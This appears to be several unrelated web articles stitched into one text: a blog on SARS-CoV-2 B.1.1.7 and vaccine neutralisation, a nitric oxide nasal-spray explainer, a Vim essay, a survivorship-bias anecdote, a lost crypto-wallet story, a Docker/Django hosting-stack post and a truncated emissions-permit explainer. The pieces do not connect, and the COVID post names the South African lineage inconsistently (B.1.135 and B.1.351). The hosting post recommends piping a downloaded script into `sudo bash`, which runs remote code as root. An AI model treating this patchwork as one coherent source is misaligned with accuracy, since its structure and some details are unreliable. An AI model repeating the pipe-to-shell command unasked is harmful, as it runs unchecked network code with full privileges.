<p>The SARS-CoV-2 lineage called B.1.1.7 arose in the United Kingdom in September 2020 and harbors 17 genomic mutations, some of which lead to amino acid changes in the spike protein (pictured). Similar but distinct variants have been detected in other locations, including South Africa (B.1.135) and Brazil, but the B.1.1.7 lineage has been best studied. A good summary of the changes can be found <a href="https://www.biorxiv.org/content/10.1101/2021.01.25.427948v1">in this manuscript</a>. A number of lines of evidence have led to the conclusion that viruses of the B.1.1.7 lineage may have increased transmissibility compared with previous isolates. These include the rapid displacement of previous variants in the UK within a short period of time; an apparent increase in the R index for such variants; and increased levels of viral RNA in nasopharyngeal washes as measured by PCR or RNA sequencing.</p>



<p>The virological definition of transmission is the movement of viruses from one host to another. In the case of SARS-CoV-2, such transmission occurs when infectious virus particles are exhaled within respiratory droplets and arrive in another host, where they initiate infection. The evidence cited above for increased transmission of the B.1.1.7 lineage are all indirect and do not prove that the variants actually transmit, in a virological sense, better between hosts. The population growth of the variant could, for example, be a consequence of changes in human behavior. The R index, a measure of transmisssibility, is influenced not only by the virus but by human behavior. The finding of increased levels of RNA in nasopharyngeal wash is also inconclusive with respect to transmission. Viral RNA is not the same as infectious virus, and no studies have been done measuring shedding of infectious virus from individuals infected with variants of the B.1.1.7 lineage compared with other variants.</p>



<p>There is no doubt that the B.1.1.7 lineage has rapidly displaced others in the UK. Whether this behavior is due to an increased ability of the virus to be transmitted form one host to another has not been demonstrated. The variant has also been detected in other countries and its dispersion in those locations are not consistent with increased transmission (as I have defined above). For example, we now know that the&nbsp;B.1.1.7 lineage <a href="https://virological.org/t/phylogenetic-evidence-that-b-1-1-7-has-been-circulating-in-the-united-states-since-early-to-mid-november/598">was present in the US</a>&nbsp;5-6 weeks before its detection in the UK, yet as of January it comprised just 0.3% of cases nationally. After 2 months of circulation in California, the lineage is estimated to account for 0.4% of cases compared with 1.2% at a similar point in the UK. In Florida the lineage is associated with higher spread, 0.7% of cases, but this is not the situation in other US states.</p>



<p>These data emphasize that we cannot conclude that the B.1.1.7 lineage is biologically more transmissible. Multiple factors are likely at play, and this is why it is better to view the B.1.1.7 lineage variants and others in terms of their fitness – the reproductive success of the virus. Many factors can influence fitness, not just transmission. These could include increased physical stability of the particle, increased resistance to immune responses, longer duration of virus presence in the nasopharynx, increased infectious virus produced within the host, more efficient establishment of infection in a host, and more. A slight increase in any of these might drive a particular variant within a population but not actually affect person to person transmission. Whether such mutations are spread by founder effect – being in the right place at the right time – also must be taken into consideration.</p>



<p>The statistical models that have been used to approximate the transmission of SARS-CoV-2 variants cannot prove a biological property because drive through a population can be a consequence of various fitness parameters. Experiments either in animal models (in which case the relevance to humans is unknown) or measurement of infectious virus in humans is needed. So far none of the latter have been done for the current variants.</p>



<p><strong>Immune control</strong></p>



<p>A more immediate concern is whether any of the changes in spike protein within VOC impact the ability of immune response to control infections. This question has been directly addressed for neutralizing antibodies, e.g. those which can block infection. Antibodies recognize specific protein sequences on the virus particle, and specifically the spike protein for those given the mRNA vaccine. Some of the spike changes identified in variants are in regions known to bind antibodies. Consequently an important question is whether vaccination can inhibit infection with the variant viruses.</p>



<p>This question has been addressed for both the Moderna and the Pfizer mRNA vaccines.&nbsp;<a href="https://www.biorxiv.org/content/10.1101/2021.01.25.427948v1">Sera from persons immunized with mRNA-1273</a>&nbsp;efficiently neutralized pseudotyped viruses bearing the SARS-CoV-2 spike glycoprotein from the B.1.1.7 lineage. These sera had a reduced (6.4 fold) neutralization titer when the South African B.1.351 lineage was used. However these sera still fully neutralized B.1.351 with a titer of 1:290 which may be sufficient to prevent severe COVID-19. Nevertheless,&nbsp;<a href="https://investors.modernatx.com/news-releases/news-release-details/moderna-covid-19-vaccine-retains-neutralizing-activity-against">Moderna has announced</a>&nbsp;that it will advance a modified vaccine (mRNA-1273.351) encoding the B.1.351 amino acid changes.</p>



<p><a href="https://www.biorxiv.org/content/10.1101/2021.01.27.427998v1">In a separate study</a>, sera from individuals vaccinated with the Pfizer BNT162b2 mRNA vaccine was tested in neutralization assays using SARS-CoV-2 viruses with selected spike amino acid changes from the B.1.1.7 (deletion of amino acids 69/70, N501Y, D614G) or B.1.351 (E484K + N501Y + D614G) lineages. These changes had small effects on neutralization with the sera. However, the engineered viruses do not contain the full set of changes found in the B.1.1.7 and B.1.351 viruses, which might explain the different results compared sera with antibodies induced by mRNA-1273.</p>



<p>These observations provide confidence that the two mRNA vaccines will provide protection against COVID-19 caused by currently circulating variants. However genomic surveillance must be increased to ensure that any new spike changes that might arise are detected quickly and their effects on neutralization determined.</p>



<p><strong>Disease severity</strong></p>



<p>A previous study did not show evidence that viruses of the B.1.1.7 lineage were associated with an increased risk of hospitalization or death. However upon examination of additional data from three separate studies&nbsp;<a href="https://app.box.com/s/3lkcbxepqixkg4mv640dpvvg978ixjtf/file/768458300892">NERVTAG concludes</a>&nbsp;that there is a ‘realistic possibility that infection with VOC B.1.1.7 is associated with an increased risk of death compared to infection with non-VOC viruses’. This conclusion was reached by statistical analyses of reported death rates among individuals infected with VOC B.1.1.7 or non-VOC viruses. For example, in one study the relative hazard of death was 1.35 (with a 95% confidence interval of 1.08-1.68). In another study the mean ratio of case fatality ratios between cases caused by VOC or non-VOC viruses was 1.36 (95% CI 1.18-1.56). These are small differences with large confidence intervals ranging from no effect to more effect, and the authors note that the absolute risk of death remains low. The statistics are computed by analyzing a limited dataset of all COVID-19 related deaths (8%) and consequently might be in error. Furthermore, there does not appear to be an increased risk of hospitalization associated with infection by VOC viruses. My reading of this report is that it mainly serves as a warning to continue genomic surveillance of variants with respect to death risk and does not come to a conclusion on causality.</p>



<p>Update: Novavax just released the <a href="https://www.nytimes.com/2021/01/28/health/covid-vaccine-novavax-south-africa.html">first results</a> of their phase 3, spike-protein based COVID-19 vaccine. Efficacy was nearly 90% in the UK, but in a smaller trial in South Africa it was 50% against the B.1.135 variant. </p>

<p>A few weeks ago, it was announced that <a href="http://www.ashfordstpeters.nhs.uk/latest-news/2610-covid-busting-nasal-spray-begins-uk-trials" target="_blank" rel="noopener">UK trials were beginning of a nasal spray proven to kill 99.9% of the coronavirus</a> that causes <a href="https://en.wikipedia.org/wiki/Coronavirus_disease_2019" target="_blank" rel="noopener">COVID-19</a>. The idea, broadly, is that you’d use the spray first thing in the morning, during the day after social interactions, and then again in the evening — and it would prevent the virus from taking hold and making you ill.</p>
<p>Awesome, right? Simple, cheap, portable. Sort of like cleaning your teeth regularly: prevention rather than cure. Combined with a <a href="https://wellcome.org/news/what-different-types-covid-19-vaccine-are-there" target="_blank" rel="noopener">vaccine</a>, particularly for anyone at high risk such as those in healthcare settings, it could put a stop to the whole thing — and might also turn out to be effective on other, less deadly but still annoying, viruses.</p>
<p>But, I hear you ask, what is it? Because if I’m going to squirt something up my nose several times a day, I have questions…</p>

<p>Fair enough. It’s actually, mostly, <a href="https://en.wikipedia.org/wiki/Nitric_oxide" target="_blank" rel="noopener">nitric oxide</a>, which has the chemical formula NO.</p>
<p>Yes, there are plenty of wordplay options here. The researchers have already jammed the letters NO into their company name, and done the acronym thing, to get <a href="https://www.clinicaltrialsarena.com/news/sanotize-trials-nasal-spray/" target="_blank" rel="noopener">SaNOtize Nitric Oxide Nasal Spray</a> (NONS). If the trials are successful, it’s probably only a matter of time before we get: “Say NO to coronavirus!” marketing. (Any ad agencies reading this, I’m claiming copyright.)</p>
<p>But that aside, unless you’re a chemist you might be thinking about some half-remembered chemical names and frowning at this point. Isn’t that… used in rocket fuel? Or… wait… isn’t that… the nasty smoggy stuff that causes lung problems?</p>
<p>Ah, well, there are several nitrogen oxides. Let me summarise:</p>
<ul>
<li>NO is <a href="https://en.wikipedia.org/wiki/Nitric_oxide" target="_blank" rel="noopener">nitrogen monoxide or nitric oxide</a> — that’s what we’re talking about here.</li>
<li>NO<sub>2</sub> is <a href="https://en.wikipedia.org/wiki/Nitrogen_dioxide" target="_blank" rel="noopener">nitrogen dioxide</a> — forms when combustion happens in air, and it’s the one that’s brown and smells horrible, and is probably most associated with <a href="https://en.wikipedia.org/wiki/Smog#Photochemical_smog" target="_blank" rel="noopener">photochemical smog&nbsp;</a>(although atmospheric NO has a significant role there, too).</li>
<li>N<sub>2</sub>O is <a href="https://en.wikipedia.org/wiki/Nitrous_oxide" target="_blank" rel="noopener">nitrous oxide</a>, sometimes just “nitrous” — that’s the one that’s also called laughing gas and is used as an anaesthetic, and “<a href="https://en.wikipedia.org/wiki/Recreational_use_of_nitrous_oxide" target="_blank" rel="noopener">recreationally</a>,” as well as being used to increase the power output of engines.</li>
<li>NO<sub>3</sub> is <a href="https://en.wikipedia.org/wiki/Nitrate_radical" target="_blank" rel="noopener">nitrogen trioxide</a> — this is a radical, with an unpaired electron. It’s unstable, but it is important in ozone chemistry.</li>
<li>N<sub>2</sub>O<sub>4</sub> is <a href="https://en.wikipedia.org/wiki/Dinitrogen_tetroxide" target="_blank" rel="noopener">nitrogen tetroxide or dinitrogen tetroxide</a> — this is important because it forms <a href="https://en.wikipedia.org/wiki/Dinitrogen_tetroxide#Structure_and_properties" target="_blank" rel="noopener">an equilibrium with NO<sub>2</sub></a> so the two can be thought of an interconvertible, and also because it’s <a href="https://en.wikipedia.org/wiki/Dinitrogen_tetroxide#Use_as_a_rocket_propellant" target="_blank" rel="noopener">used as a rocket propellent</a>.</li>
</ul>

<p>There are <a href="https://en.wikipedia.org/wiki/Nitrogen_oxide" target="_blank" rel="noopener">other nitrogen oxides</a>, not to mention ions — but let’s not spend all day on this. Nitrogen forms this confusing hodgepodge of oxides because it has five electrons in its outermost shell (it’s in <a href="https://www.britannica.com/science/nitrogen-group-element" target="_blank" rel="noopener">group 15</a> of the periodic table) and because there’s not much difference in the <a href="https://en.wikipedia.org/wiki/Electronegativity" target="_blank" rel="noopener">electronegativities</a> of oxygen and nitrogen. So essentially, it can share electrons with oxygen to form bonds in a number of different ways to obtain a <a href="https://en.wikipedia.org/wiki/Electron_configuration#Noble_gas_configuration" target="_blank" rel="noopener">stable, full outer shell</a>.</p>
<p>For any students reading this, I’m sorry. You… pretty much just have to remember these. Yes, I know. That’s why experienced chemists so often use the shorthand <a href="https://en.wikipedia.org/wiki/NOx" target="_blank" rel="noopener">NOx </a>— we just can’t be bothered keeping all the names straight. (Okay, before someone shouts at me, actually NOx is handy because we’re often talking about more than one oxide at a time, and it allows us to easily express that.)</p>
<p>Back to NO. It’s a colourless gas, and it has an unpaired electron, which makes it a <a href="https://en.wikipedia.org/wiki/Radical_(chemistry)" target="_blank" rel="noopener">free radical</a>. And… here we go again. Aren’t we supposed to eat lots of <a href="https://en.wikipedia.org/wiki/Antioxidant" target="_blank" rel="noopener">antioxidant-</a>rich fruit and vegetables to mop up free radicals? They’re bad, aren’t they?</p>

<p>Yes and no. Free radicals are reactive species which damage cells and can cause illness and ageing. Too much exposure to free radicals causes something <a href="https://en.wikipedia.org/wiki/Oxidative_stress" target="_blank" rel="noopener">oxidative stress</a>, which is definitely bad. But. It turns out that nitrogen oxide is an important <a href="https://en.wikipedia.org/wiki/Gaseous_signaling_molecule" target="_blank" rel="noopener">signalling molecule</a>, that is, a molecule which is the body uses to send chemical signals from one place to another. In particular, nitrogen oxide “tells” the <a href="https://en.wikipedia.org/wiki/Nitric_oxide#Biological_functions" target="_blank" rel="noopener">smooth muscle around blood vessels to relax</a>, causing those blood vessels to dilate, and increasing blood flow. Viagra (aka <a title="" href="https://en.wikipedia.org/wiki/Sildenafil">Sildenafil</a>) uses the nitric oxide pathway, and I think we all know what that does, don’t we? Good.</p>
<p>Nitric oxide has also been shown to <a href="https://pubmed.ncbi.nlm.nih.gov/17170603/" target="_blank" rel="noopener">reduce blood pressure</a>, which is generally considered a good thing — <a href="https://www.nhs.uk/conditions/low-blood-pressure-hypotension/" target="_blank" rel="noopener">up to a point, obviously</a>. This is why you can buy lots of so-called <a href="https://www.medicalnewstoday.com/articles/326381" target="_blank" rel="noopener">nitric oxide supplements</a>, which, since nitrogen oxide is a gas at room temperature, don’t actually contain nitric oxide on its own. Rather, they’re a mixture of amino acids and other things that supposedly help the body to <em>make</em> NO. But it might be cheaper, and healthier, to eat plenty of beetroot or drink beetroot juice, since there’s evidence that <a href="https://pubmed.ncbi.nlm.nih.gov/29370244/" target="_blank" rel="noopener">does the same sort of thing</a>.</p>
<p>As always, <a href="https://en.wikipedia.org/wiki/The_dose_makes_the_poison" target="_blank" rel="noopener">the dose makes the poison</a>. Too <a href="https://en.wikipedia.org/wiki/Nitric_oxide#Occupational_safety_and_health" target="_blank" rel="noopener">much nitric oxide is definitely problematic</a>, but administered in the right way and in appropriate doses, it’s extremely safe.</p>
<p>It’s suggested that the nitric oxide in the <a href="https://sanotize.com/" target="_blank" rel="noopener">SaNOtize</a> nasal spray destroys the virus and also helps to stop viral replication within cells. Plus, it <a href="https://theconversation.com/what-is-the-ace2-receptor-how-is-it-connected-to-coronavirus-and-why-might-it-be-key-to-treating-covid-19-the-experts-explain-136928" target="_blank" rel="noopener">blocks the receptors</a> that the virus uses to enter cells in the first place. Essentially, it locks the doors and rains down fire on the potential intruders — nice work.</p>
<p>You only need to use the spray occasionally, because developing a COVID-19 infection isn’t instant. First the virus gets into your nose, then it attaches to cells, then it replicates, and <em>then</em> it sheds into your lungs. There are timescales involved here — so long as the spray is used every so often it should do the trick.</p>
<p>Another advantage is that this should, theoretically, work on other strains — where the current vaccines may not. So it could provide a very important stopgap when vaccination isn’t immediately available.</p>

<p>All sounds fabulous, doesn’t it? It might be, but, we’re in the early stages with this. Clinical trials <a href="http://www.ashfordstpeters.nhs.uk/latest-news/2610-covid-busting-nasal-spray-begins-uk-trials" target="_blank" rel="noopener">have now started in the UK</a>, are already in <a href="https://sanotize.com/wp-content/uploads/2020/04/SaNOtize_HC_USU_release_FINAL.pdf" target="_blank" rel="noopener">Phase II in Canada</a> and have been approved to start in the USA. Researchers are hopeful, but we need to wait for the evidence.</p>
<p>So in the meantime, <a href="https://twitter.com/chronicleflask/status/1283015334732103682" target="_blank" rel="noopener">wear a mask</a>, <a href="https://chronicleflask.com/2020/03/26/cleaning-chemistry-awesome-soap/">wash your hands,</a> and take a vaccine if you’re offered one. Stay safe out there!</p>

<p>Many tools come and go as our software and devices change - or we get bored and want to try something new and shiny. One of the few exceptions for me has been the <a href="https://www.vim.org/">Vim text editor</a>, which I use for programming, emails, and writing every day. In this post I want to share why Vim is remarkable but more generally why learning a text editor is a great investment.</p>

        <p>It may not be obvious why text editors are useful tools. Many programs, like web browsers, email clients, and <a href="https://en.wikipedia.org/wiki/Integrated_development_environment">integrated development environments (IDEs)</a>, have built-in text editing functionality. Why use a separate text editor? Text editors go deep. They are much more powerful than text boxes in browsers and email clients while being more general than IDEs. While IDEs often have excellent programming language-specific functionality, they are rarely used for other text editing tasks like writing emails or documents because they are specialized tools. Text editors strike a good balance of powerful editing and support for programming without being boxed into a narrow use-case.</p>

        <p>Getting started with a text editor is easy. Vim implements the arcane <a href="https://en.wikipedia.org/wiki/Vi">vi editor</a> user interface but has many <a href="https://www.youtube.com/playlist?list=PLcTu2VkAIIWzD2kicFNHN2c35XQCeZdsv">videos</a>, <a href="http://vimsheet.com/">cheatsheets</a>, and <a href="https://vim.fandom.com/wiki/Tutorial">tutorials</a> that make it fun to try. Really getting familiar with the features and customizing the editor to your own needs takes time though. This is true for any popular text editor because the number of settings, extensions, or plugins available can be huge. However, once you are familiar with a text editor you will have a powerful tool that can be used for most tasks involving writing or manipulating text. The time investment will pay off as you use the editor for todo lists, emails, documentation, programming, configuration files, and more.</p>

        <p>This explains why I've found Vim a useful and enduring tool that I use daily. But what makes it a particularly strong text editor compared to the other options? Text editors go in and out of fashion all the time. I remember many that attracted attention for a time but then faded away. Vim has remained popular and I think there are a few reasons for that.</p>

            <p><b>Powerful text editing plus IDE-like functionality.</b> The vi user interface is actually a language of text editing operators. The keys you press aren't just keyboard shortcuts, they are like a bytecode (!) for a text manipulation CPU that is <a href="https://en.wikipedia.org/wiki/Turing_complete">Turing-complete</a>. Years ago I wrote vi macros that solve the <a href="https://en.wikipedia.org/wiki/Stable_marriage_problem">stable marriage problem</a> to demonstrate this. For many geeks this alone might be enough to convince you to learn Vim! But on top of this crazy text editing power Vim also has IDE-like functionality including syntax highlighting, completion, code search and navigation, compiler error navigation, and diffing. There is a large collection of plugins and scripts if you want to extend Vim's functionality even further.</p>

  <p><b>Vim is ubiquitous.</b> It runs on all major operating systems but furthermore it is found on devices from tiny Wi-Fi routers to the largest servers. It has a GUI but also a terminal interface if you are connecting to a remote machine over SSH. I always find it strange when I see people use their editor of choice on their laptop but then use another, less-familiar editor when connecting to remote machines. Learn Vim and you can use it everywhere!</p>

  <p><b>Keyboard-friendly.</b> Constantly moving my hand between the mouse and keyboard is tiring and distracting. Vim has excellent keyboard support and many things can be done without leaving the <a href="https://en.wikipedia.org/wiki/Home_row#Home_row">home row</a> on the keyboard, including navigating, inserting, and deleting text. I find there is no need to use the arrow keys, mouse, or anything that is hard to reach.</p>

<p>If you are looking for a powerful text editor that you can use for many years then I recommend Vim. It's also worth looking at Emacs, which has a different angle but is also a good time investment. Looking back on 17 years of using Vim, I'm happy I stopped switching between language-specific IDEs and instead found a text editor capable of handling all tasks.</p>

      <p>One of the R.A.F.’s top priorities during WW2 was improving the odds that its notoriously expensive and strategically crucial bombers will make it back from bombing runs over Germany.</p>
<p>The returning airplanes were rigorously scrutinised, and military experts were busy designing improved armouring along the wings and the rear gunner’s station – the bits of the planes that tended to have the most holes in them.</p>
<p>This seemed like a sensible thing to do. Until a statistician by the name of&nbsp;<a href="http://en.wikipedia.org/wiki/Abraham_Wald" target="_blank">Abraham Wald</a>&nbsp;came along.</p>
<p><em>“You fucks”,</em> I imagine him saying, <em>“the bits where the planes that came back have holes are precisely the bits where it doesn’t matter. The planes are weakest where the ones you’re looking at are unscathed – precisely because the ones that got hit there didn’t come back. Reinforce the armouring where the planes that came back are immaculate.”</em></p>
<p>And substantially more planes started coming back.</p>
<p>Obvious. Ex post facto. Ex ante, practically invisible. Most people would make the same error as the experts.</p>
<p>When “fails”, or the things that didn’t make it through a certain selection process, are absent from statistical samples, which is most of the time, identifying decisive factors and points of failure becomes nontrivial – they cannot be divined just from the “wins”, or the things that did make it, without serious lateral thinking.</p>
<p>This principle is heavily in action whenever we try, for instance, to isolate the common features of successful athletes, artists, scientists, therapies, investment vehicles, companies or anything else in order to imitate them. <em>And then, reinforce the armouring along the wings.</em></p>
<p>This was my reaction when I figured this out and appreciated it fully:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  <article>
    <p>Back in early 2012, I did some online gambling on <strong><em>the dark web</em></strong> 🥸</p>
    <p>The currency was Bitcoins, which back then weren't worth anything, and practically couldn't be used for
      anything.
      Other than drugs, illicit activities, and whatever people were trying to scam you into buying.</p>
    <p>There was even a website you could visit once a day, which gave you a small amount of bitcoins - two cents if I
      recall - for free, <em>just 'cause.</em></p>
    <p><small>Side note: Those two bitcoin cents would be worth almost $700 at the time of writing.</small></p>
    <p>I ended up with a couple of hundred dollars in winnings. I was pretty good at poker and blackjack.</p>
    <p>... or probably just very lucky.</p>
    <p>I tried to get them paid out, but I couldn't figure out a way to do it. Neither Western Union nor PayPal -
      two of the more reasonable payout options on MtGox - worked in the Faroe Islands (which is were I lived at the
      time). Some people seemed to get them paid out as Amazon giftcards, but even Amazon was flaky at best in the
      Faroes.</p>
    <p>So I didn't get them paid out. They were stored in a file on my machine called wallet.dat, and there they
      remained.</p>
    <p>My interests in gambling and <strong><em>the deeeeep dark web</em></strong> waned, and I forgot about them. The
      wallet.dat file remained on my harddrive, lost to time.</p>
    <hr>
    <p><strong>Years later</strong>, in late 2017 I believe, bitcoins were exploding.</p>
    <p>I had no clue where the old harddrive was. And if I remember correctly, it broke back in 2013, and was
      replaced.</p>
    <p><em>To this day</em>, whenever I find an old harddrive, or boot up an old computer, I make an exhaustive search,
      trying to locate this old wallet.dat file.
      I have repressed the traumatic memory of calculating how much I potentially had, but I faintly remember it being
      in the millions. 💸💸💸💸</p>
    <p>I try to tell myself, that it is as if I got it paid out all those years ago. As if I got them paid out, and
      spent them all on beer. It is what I would have done anyhow.</p>
    <p>But it still hurts a bit. 😅</p>
    <p>... Okay not a bit, a lot.</p>
    <hr>
    <p>The day before yesterday, on the 28th of January 2021, I had to do some work on our Office 365 email system. For
      <em>some</em> reason, the only way to create DKIM keys for a domain, is via PowerShell. So I had to bust out an
      old laptop that runs Windows.</p>
    <p>I bought it second-hand back in 2013, so there was no way the Bitcoin wallet was to be found there. But logic be
      damned, we're talking about millions here. Couldn't hurt to do an exhaustive search.</p>
    <p>First step, search for "wallet" in AppData. It finds a bunch of stuff - like some images used by Google
      Chrome. And then, at the very bottom:</p>
    <blockquote>
      <p><strong>wallet.dat</strong></p>
    </blockquote>
    <p>To my surprise, I had actually found a wallet.dat file. 💰💰💰</p>
    <p>I immediately backed it up, and with my stomach bursting with butterflies, I began trying to recover it.</p>
    <p>Only to find, that it was a password-protected Dogecoin wallet.</p>
    <p>I don't even remember trying out Dogecoin. But apparently I did.</p>
    <p>I searched for ways to recover Dogecoin wallets, and to my surprise, it has been skyrocketing as of late!</p>
    <p>... But according to the results, I have no way of accessing the wallet, because I have no fucking clue what the
      password is. 💸💸💸💸</p>
    <p>I tell myself it's empty. But I'll never be able to find out for certain. It's the uncertainty that's
      the worst.</p>
    <p><strong>Woe is me.</strong></p>
    <hr>
    <p>My experiences with crypto are not <em>all</em> bad, though. I bought some Bitcoins back in 2018, after they had
      thouroughly crashed, and earned a solid sum when they exploded once again a couple of weeks back.</p>
    <p>But I'll never buy crypto again. Ever!</p>
    <p><small>... I think.</small></p>

<!--kg-card-end: markdown--><h3 id="hosting">Hosting</h3><p>Your stuff needs a home (yes, even in the "serverless" world. LOL). My personal preferences are <a href="https://azure.com/">Azure</a>, <a href="https://m.do.co/c/c844c6492d23">Digital Ocean</a> <em>(affiliate link)</em>, or <a href="https://scaleway.com/">Scaleway</a>. They each offer enough compute, networking options, storage, and basic services to build out proofs-of-concept or whatever you might need.</p><p>Another honorable mention here is <a href="https://hetzner.com/">Hetzner</a>. They offer a good level of hardware, service and price.</p><h3 id="the-virtual-machines">The Virtual Machines</h3><p>For those side projects and many enterprise applications, <strong>scale is not an issue</strong>. That means that I will not serve thousands of simultaneous users or handling terabytes of data. Therefore I can get by on the smaller offerings – usually under $20/month. Even Azure (the most expensive of the three) offer their burstable VMs. Generally I like to go with <a href="https://www.scaleway.com/en/virtual-instances/development/">Scaleway's Developer line of servers</a>.</p><p><em><strong>Notice that Kubernetes is missing from my stack? When scale is not an issue then you don't need Kubernetes.</strong></em></p><h3 id="docker-just-plain-docker-">Docker. Just plain Docker.</h3><p>I do not rely on the OS vendor (Ubuntu) to make sure that I run the latest Docker on new VMs. Therefore I use the nice little <code>curl|bash</code> technique.</p><pre><code>curl -s https://get.docker.com | sudo bash</code></pre><p>This cure one-liner will get the best and most recent version for your machine running.</p><h3 id="traefik-for-reverse-proxy">Traefik for Reverse Proxy</h3><p>Traefik has been a God-send since I found it. Nginx is great, but it was not built for the Docker universe. Traefik has two killer features that have saved me hours upon hours:</p><ol><li>Automatic TLS with LetsEncrypt. Literally set-it-and-forget-it. With the right API keys and DNS provider you can also do verification with DNS.</li><li>Automatic no-reload configuration using docker labels. When you spin up new services Traefik will pickup the changes automatically because it listens to all Docker-related events. This makes it incredibly convenient to add, remove, or merge services as needed without any hassle.</li></ol><p>My only comment on Traefik is that there is a bit of a learning curve. You have to decide how you want to configure it (config file, command line options, yaml, or docker labels, or use a combination!)</p><!--kg-card-begin: html--><p>Another note here: I have already <a href="https://www.simplecto.com/traefik-2-0-docker-and-letsencrypt/" title="Traefik 2 production ready configurations">published my production configuations for Traefik</a> here.</p><!--kg-card-end: html--><h3 id="postgres-for-database">Postgres for Database</h3><p>Tried and True, PostgreSQL has never let me down. I usually attach one of these containers to a project that needs it without any difficulty. I simply spin up the container, bind the ports, and then bind the data volume to my host disk. Done and Done.</p><!--kg-card-begin: markdown--><h3 id="dockercomposeyml">docker-compose.yml</h3>

<!--kg-card-end: markdown--><h3 id="dockerized-django-for-web">Dockerized Django for Web</h3><p>Docker deploys nicely in a container, and I have been doing it for a few years now. The benefits of matching your development environment to your production one cannot be overstated, and I have Docker to thank for that.</p><p>Edit: 2021, I've got a reference Django project up that I use as my template for new projects: <a href="https://github.com/simplecto/django-reference-implementation">https://github.com/simplecto/django-reference-implementation</a></p><h3 id="django-commands-for-asynchronous-tasks">Django commands for Asynchronous tasks</h3><p>Also, for asynchronous tasks I simply use <a href="https://docs.djangoproject.com/en/3.0/howto/custom-management-commands/">custom Django commands</a> which are a part of the standard framework. The pattern here is a simple <code>while</code> loop with a <code>sleep()</code> period. It polls the database for relevant actions and then does it's thing. &nbsp;</p><p>Edit: 2021 - This has paid off in a big way. I have been running a website screenshot project for over a year now with this pattern. It takes about 1500 website screenshots per day. All of it is scheduled and managed by a Django command.</p><p>That project lives here: https://github.com/simplecto/screenshots</p><h3 id="intercoolerjs-because-who-needs-the-complexity">IntercoolerJS, because who needs the complexity?</h3><p>I have a lot to say about this, but that will have to go into a series of posts. The tldr; here that I use this lovely little javascript library along with jQuery (<em>yeah, it is 2020, and I still use jQuery</em>) to make parts of my applications <em>feel</em> like single-page-apps but not really.</p><p>IntercoolerJS keeps that old-school "Ajax" (remember that word) goodness and allows me to update the DOM with HTML from the backend. It is seamless, smooth, and really convenient for things like logins and small form updates.</p><p>I strongly suggest you check it out: <a href="https://intercoolerjs.org/">Learn more about IntercoolerJS</a></p><p>Edit 2021: The creator has released <a href="https://htmx.org/">HTMX</a>, the successor to IntercoolerJS.</p><h3 id="sentry-to-catch-production-errors">Sentry to catch production errors</h3><p>I make mistakes. Lots of mistakes--but there is no need to show them to my users, right? Sentry gives me an easy and convenient way to capture production bugs as they happen. Some cool things about them:</p><ol><li>Open source-ish (<a href="https://blog.sentry.io/2019/11/06/relicensing-sentry">relicensed here</a>), so you can host yourself if that is your thing.</li><li>Easy few lines added to your <code>settings.py</code> file in Django and that is it.</li><li>Tight integration to your Git repos and Issue tracking systems for full production defect traceability.</li></ol><p>Another nice thing is that you can disable it for development.</p><p><a href="https://sentry.io/">Check out Sentry here</a>.</p><h3 id="bitbucket-pipelines-for-ci-cd">Bitbucket Pipelines for CI/CD</h3><p>Edit: 2021 - I no longer use CI/CD for deployment of my one-man projects. It is too much tooling and complexity. I simply run tests with PyCharm and ship directly to production from my development machine.</p><p>There are so many CI/CD offerings out there today, but I have been happy with Bitbucket's offering called Pipelines. They offer you a few hundred minutes free every month with the option to top-up as needed for a small fee. I have rarely had problems, and I really enjoy their YAML configuraiton / directive files. </p><p>Using the <code>bitbucket-pipelines.yml</code> file I have been able to do full end-to-end testing by spinning up multiple docker containers, loading the databases, and running hundreds of test in just a few minutes. This was key in speeding things up in our team and enabling 5+ pushes to production per day.</p><p><a href="https://bitbucket.org/">Checkout Bitbucket here</a>.</p><h3 id="zerotier-for-vpn-control-plane">ZeroTier for VPN/Control Plane</h3><p>Finally, we come to the bit of tech that is largely optional but nice to have. &nbsp;Zerotier is a unique kind of network/VPN that I use to link all my personal machines. It works though firewalls (at home, in office) and offers an easy 1 minute setup.</p><p>Using ZeroTier in my last company we were able to remove the SSH Jump Servers which caused a headache in terms of key management and shared bandwidth on a single machine.</p><p>Zerotier work on Linux, Mac, Windows, Android, and iPhone, so you are pretty much covered.</p><p>The one downside to ZeroTier is that I don't entirely understand how it works. It is a lot like MacOS or iPhone in that it "just works" as expected and I rarely (never) have problems. That is a strength from a user experience perspective but a WTF? from a CTO perspective. </p><h3 id="conclusion">Conclusion</h3><p>Hopefully this deeper-dive will prompt some interest and curiosity about Docker, Django, Traefik, and especially IntercoolerJS. It is simple, easy to work with, and allows you to grow out of it when the time comes.</p><p>Edit 2021 - As you can see not a lot has changed. I've been able to add more code to my public repositories that flesh out the ideas expressed here over a year ago.</p>

<p><strong>Summary</strong><span>:&nbsp;</span></p>
<p><span>One way that some states are combating emissions is by selling a fixed number of pollution permits to power plants. Currently, governments reduce the number or pollution permits by 3% each year to force power plants to find cleaner ways to operate (more efficient power plants, renewable energy, etc.)&nbsp;</span></p>

<p><span>Kotoo allows individuals to help lower emissions faster because permits Kotoo buys become unavailable to power plants, forcing them to reduce their emissions.&nbsp;</span></p>

<p><span>Imagine the government has a concert venue and it’s throwing a renewable energy benefit concert by a band called Carbon Dioxide (CO2). All the power plants have attended the CO2 concert for decades. Some people want power plants to attend a concert by a new band called Renewable Energy so they buy and shred the tickets to the CO2 concert so that the power plants can’t attend. Since the power plants can’t do without music - they go to the Renewable Energy concert instead. They learn that Renewable Energy is so good (it’s cheaper!) that they never go back to the Carbon Dioxide concert. Eventually all the seats in Carbon Dioxide concert are empty so the band stops playing and shredding tickets is no longer needed.</span></p>

<p><span>While the Renewable Energy fans could just go to the RE concert - buying out the CO2 tickets still builds renewable energy since it’s a benefit concert while also preventing CO2 from being emitted. It ultimately converts old CO2 enthusiasts rather than waiting for Renewable Energy to become so dominant it overtakes CO2.&nbsp;</span></p>

<p><span><a href="https://info.kotoo.earth/hc/en-us/articles/360058439833" target="_self">Why powerplants are the key to climate change</a></span></p>


<p><strong>Details</strong><span>:</span></p>
<p><span>Another way to think about emissions is by thinking about fuel because emissions are directly related to fuel burned.* But some powerplants get more electricity out of a given amount of fuel - just like how different cars go different distances on the same amount of fuel. So we can think about power plant emissions just like how you might think about gas mileage - some go further than others but the ones that are more efficient are more expensive.&nbsp;</span></p>

<p><span>Let’s say that there was a fixed amount of fuel available every three months. Every three months, everyone shows up to buy the fuel but there's only a set amount available. Since people want more fuel than is available - the government sets up an auction and sells it to the highest bidders.&nbsp;</span></p>

